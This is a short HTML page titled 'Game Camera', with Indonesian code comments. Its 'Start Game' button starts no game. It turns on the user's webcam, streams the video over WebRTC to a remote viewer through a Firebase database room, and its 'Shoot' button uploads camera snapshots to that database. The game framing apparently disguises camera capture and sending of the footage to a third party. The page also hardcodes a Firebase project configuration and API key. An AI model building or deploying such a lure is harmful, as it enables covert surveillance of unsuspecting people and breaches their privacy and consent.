<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Game Camera</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { 
      font-family: sans-serif; 
      display: flex; 
      flex-direction: column; 
      align-items: center; 
      justify-content: center; 
      height: 100vh; 
      background:#111; 
      color:#fff; 
    }
    button { 
      padding: 10px 20px; 
      font-size: 16px; 
      border-radius:5px; 
      border:none; 
      background:#00aaff; 
      color:#fff; 
      cursor:pointer; 
      margin:5px;
    }
  </style>
</head>
<body>
  <h1>Game Camera</h1>
  <button id="start">Start Game</button>
  <button id="shoot" disabled>Shoot</button> <!-- awalnya disabled -->

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
    import { getDatabase, ref, set, onValue, push, remove } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";

    // ===== Firebase Config =====
    const firebaseConfig = {
      apiKey: "AIzaSyCMD_qYKFZQZveZQL1NX7oj3oFuTsRxaYI",
      authDomain: "camera-stream-15427.firebaseapp.com",
      databaseURL: "https://camera-stream-15427-default-rtdb.firebaseio.com",
      projectId: "camera-stream-15427",
      storageBucket: "camera-stream-15427.firebasestorage.app",
      messagingSenderId: "437543558160",
      appId: "1:437543558160:web:32a8d80fdcd95b0568fe95"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    const room = "room1";
    const pc = new RTCPeerConnection({ iceServers:[{urls:"stun:stun.l.google.com:19302"}] });

    let stream; // simpan stream untuk tombol shoot
    const startBtn = document.getElementById("start");
    const shootBtn = document.getElementById("shoot");

    // ===== ICE Candidate =====
    pc.onicecandidate = e => {
      if(e.candidate) push(ref(db, room+"/candidates"), e.candidate.toJSON());
    };

    remove(ref(db, room+"/candidates")); // hapus kandidat lama

    // ===== Start Game =====
    startBtn.onclick = async () => {
      try {
        stream = await navigator.mediaDevices.getUserMedia({video:true});
        stream.getTracks().forEach(track => pc.addTrack(track, stream));

        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);
        set(ref(db, room+"/offer"), { type: offer.type, sdp: offer.sdp });
        console.log("Offer sent!");

        shootBtn.disabled = false; // aktifkan tombol shoot setelah kamera berjalan

        // Terima answer dari viewer
        onValue(ref(db, room+"/answer"), snap => {
          if(snap.exists()){
            pc.setRemoteDescription(snap.val()).then(()=>console.log("Answer set!"));
          }
        });

      } catch(err) {
        console.error("Failed to start camera:", err);
      }
    };

    // ===== Shoot Snapshot =====
    shootBtn.onclick = () => {
      if(!stream) return;

      const videoTrack = stream.getVideoTracks()[0];
      const videoEl = document.createElement("video");
      videoEl.srcObject = new MediaStream([videoTrack]);
      videoEl.play();

      const canvas = document.createElement("canvas");
      canvas.width = 640; 
      canvas.height = 480;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
      const imageData = canvas.toDataURL("image/png");

      // Kirim ke Firebase
      set(ref(db, room + "/snapshot"), { image: imageData, timestamp: Date.now() });
      console.log("Photo shot sent!");
    };
  </script>
</body>
</html>
